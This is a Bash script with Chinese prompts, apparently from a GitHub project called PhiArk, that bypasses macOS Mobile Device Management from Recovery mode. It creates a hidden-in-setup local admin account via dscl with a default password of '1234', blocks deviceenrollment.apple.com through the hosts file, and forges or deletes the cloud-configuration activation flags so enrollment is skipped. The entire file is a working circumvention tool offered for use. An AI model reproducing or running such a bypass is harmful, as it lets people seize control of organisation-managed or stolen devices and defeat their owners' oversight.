#!/bin/bash
set -euo pipefail

export PATH="/usr/bin:/bin:/usr/sbin:/sbin:$PATH"

RED='\033[1;31m'
GRN='\033[1;32m'
BLU='\033[1;34m'
YEL='\033[1;33m'
CYAN='\033[1;36m'
NC='\033[0m'

echo -e "${CYAN}*-------------------*---------------------*${NC}"
echo -e "${RED}*             PhiArk-GITHUB               *${NC}"
echo -e "${RED}*        MDM绕过脚本  Anti WAS V0.1         *${NC}"
echo -e "${RED}*             版权所有 Phiark©️             *${NC}"
echo -e "${CYAN}*-------------------*---------------------*${NC}"
echo ""

echo -e "${GRN}请选择磁盘:${NC}"
echo -e "${YEL}当前可用磁盘:${NC}"
ls /Volumes
echo ""

read -p "请输入系统磁盘名称 (默认: Macintosh HD): " sysdisk
sysdisk=${sysdisk:-"Macintosh HD"}
sysdisk_path="/Volumes/${sysdisk}"

read -p "请输入数据磁盘名称 (默认: Macintosh HD - Data): " datadisk
datadisk=${datadisk:-"Macintosh HD - Data"}
datadisk_path="/Volumes/${datadisk}"

dscl_path="${datadisk_path}/private/var/db/dslocal/nodes/Default"
config_profiles_path="${sysdisk_path}/var/db/ConfigurationProfiles/Settings"

PS3='请选择操作: '
options=("恢复模式自动绕过" "重启" "退出")
select opt in "${options[@]}"; do
  case $opt in
  "恢复模式自动绕过")
    echo -e "${GRN}[正在执行恢复模式绕过...]${NC}"
    
    if [ ! -d "${datadisk_path}" ]; then
      echo -e "${RED}错误: 数据磁盘未挂载，请检查名称是否正确${NC}"
      exit 1
    fi
    
    if [ ! -d "${dscl_path}" ]; then
      echo -e "${RED}错误: 数据磁盘未正确挂载到 ${dscl_path}${NC}"
      exit 1
    fi

    echo -e "${CYAN}=== 用户创建步骤 ===${NC}"
    echo -e "${BLU}提示：直接回车将使用默认值${NC}"
    
    read -p "请输入全名 (默认: Apple): " realName
    realName=${realName:-"Apple"}
    
    read -p "请输入用户名（无空格）(默认: Apple): " username
    username=${username:-"Apple"}
    if [[ "$username" =~ [^a-zA-Z0-9] ]]; then
      echo -e "${RED}错误: 用户名只能包含字母和数字${NC}"
      exit 1
    fi
    
    read -sp "请输入密码 (默认: 1234): " passw
    passw=${passw:-"1234"}
    echo ""
    
    user_home="${datadisk_path}/Users/${username}"
    
    if [ ! -d "${dscl_path}" ]; then
      echo -e "${RED}错误: 目录 ${dscl_path} 不存在，请检查数据磁盘${NC}"
      exit 1
    fi
    
    echo -e "${GRN}正在创建用户...${NC}"

    dscl -f "${dscl_path}" localhost -delete "/Local/Default/Users/${username}" >/dev/null 2>&1 || true
    rm -rf "${user_home}" >/dev/null 2>&1 || true

    next_id=$(dscl -f "${dscl_path}" localhost -list "/Local/Default/Users" UniqueID | awk '{print $2}' | sort -n | tail -n 1 | awk '{print $1+1}')
    
    mkdir -p "${user_home}" || {
      echo -e "${RED}错误: 无法创建用户目录 ${user_home}${NC}"
      exit 1
    }

    dscl -f "${dscl_path}" localhost -create "/Local/Default/Users/${username}" UserShell "/bin/zsh"
    dscl -f "${dscl_path}" localhost -create "/Local/Default/Users/${username}" RealName "${realName}"
    dscl -f "${dscl_path}" localhost -create "/Local/Default/Users/${username}" UniqueID "${next_id}"
    dscl -f "${dscl_path}" localhost -create "/Local/Default/Users/${username}" PrimaryGroupID "20"
    dscl -f "${dscl_path}" localhost -create "/Local/Default/Users/${username}" NFSHomeDirectory "${user_home}"
    if ! dscl -f "${dscl_path}" localhost -passwd "/Local/Default/Users/${username}" "${passw}"; then
      echo -e "${RED}错误: 为用户 ${username} 设置密码失败${NC}"
      exit 1
    fi
    dscl -f "${dscl_path}" localhost -append "/Local/Default/Groups/admin" GroupMembership "${username}"

    chown -R "${username}:staff" "${user_home}"

    echo -e "${CYAN}=== 修改Hosts文件，屏蔽MDM服务器 ===${NC}"
    hosts_path="${sysdisk_path}/etc/hosts"
    if [ -f "${hosts_path}" ]; then
      echo "0.0.0.0 deviceenrollment.apple.com" >> "${hosts_path}"
      echo -e "${GRN}成功屏蔽MDM服务器${NC}"
    else
      echo -e "${RED}警告: 未找到hosts文件，跳过此步骤${NC}"
    fi

    echo -e "${CYAN}=== 修改系统配置 ===${NC}"
    touch "${datadisk_path}/private/var/db/.AppleSetupDone"
    rm -rf "${config_profiles_path}/.cloudConfigHasActivationRecord"
    rm -rf "${config_profiles_path}/.cloudConfigRecordFound"
    touch "${config_profiles_path}/.cloudConfigProfileInstalled"
    touch "${config_profiles_path}/.cloudConfigRecordNotFound"

    echo -e "${CYAN}====== 自动绕过完成 ======${NC}"
    echo -e "${YEL}请退出终端并重启Mac${NC}"
    break
    ;;

  "重启")
    echo -e "${GRN}正在重启系统...${NC}"
    reboot
    ;;

  "退出")
    echo -e "${GRN}正在退出...${NC}"
    exit 0
    ;;

  *)
    echo -e "${RED}无效选项: $REPLY${NC}"
    ;;
  esac
done

exec > >(tee -a "${datadisk_path}/mdm_bypass.log") 2>&1
